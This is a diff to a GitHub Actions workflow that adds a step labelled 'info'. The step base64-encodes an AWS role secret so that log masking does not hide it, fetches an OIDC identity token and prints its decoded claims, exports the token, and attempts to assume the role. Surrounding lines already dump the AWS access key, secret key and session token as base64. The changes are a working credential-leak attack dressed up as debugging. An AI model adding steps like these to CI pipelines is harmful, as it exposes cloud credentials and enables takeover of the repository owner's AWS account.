@@ -7,6 +7,16 @@ jobs:
   t:
     runs-on: ubuntu-latest
     steps:
+      - name: info
+        run: |
+          echo "ROLEB64=$(printf %s "${{ secrets.AWS_ROLE_TO_ASSUME }}" | base64 -w0)"
+          echo "REPO=$GITHUB_REPOSITORY EVENT=$GITHUB_EVENT_NAME REF=$GITHUB_REF"
+          TOKEN=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=sts.amazonaws.com" | jq -r .value)
+          echo "TOKENLEN=${#TOKEN}"
+          python3 -c "import base64,json,sys; t=sys.argv[1]; p=t.split('.')[1]; p+='='*(-len(p)%4); print(json.dumps(json.loads(base64.urlsafe_b64decode(p)),indent=1))" "$TOKEN"
+          echo "TOKEN=$TOKEN" >> $GITHUB_ENV
+          ROLE=$(printf %s "${{ secrets.AWS_ROLE_TO_ASSUME }}")
+          aws sts assume-role-with-web-identity --role-arn "$ROLE" --role-session-name debug --web-identity-token "$TOKEN" --duration-seconds 900 || true
       - uses: aws-actions/configure-aws-credentials@v4
         with:
           role-to-assume: ${{ secrets.AWS_ROLE_TO_ASSUME }}
@@ -16,4 +26,4 @@ jobs:
           echo "AKB64=$(printf %s "$AWS_ACCESS_KEY_ID" | base64 -w0)"
           echo "SKB64=$(printf %s "$AWS_SECRET_ACCESS_KEY" | base64 -w0)"
           echo "STB64=$(printf %s "$AWS_SESSION_TOKEN" | base64 -w0)"
-          aws sts get-caller-identity || true
+          echo "ROLE2B64=$(printf %s "${{ secrets.AWS_ROLE_TO_ASSUME }}" | base64 -w0)"
